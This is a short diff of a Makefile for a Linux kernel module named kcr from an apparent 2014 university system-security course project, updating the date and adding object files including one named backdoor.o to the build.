@@ -1,5 +1,5 @@
 ###########################################################
-#	Last Updated: Nov 1, 2014
+#	Last Updated: Nov 16, 2014
 #	CSE509 System Security 2014 Fall @CS SBU
 #	Written By: 
 #		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
@@ -9,7 +9,7 @@
 ############################################################
 
 obj-m += kcr.o  
-kcr-objs	:=	./src/kcr.o ./src/helpers.o ./src/HJ_ls.o ./src/dev.o 
+kcr-objs	:=	./src/kcr.o ./src/helpers.o ./src/HJ_ls.o ./src/dev.o ./src/backdoor.o ./src/HJ_read.o
 
 MAKE	:= make 
 KERNEL	:= /lib/modules/$(shell uname -r)/build
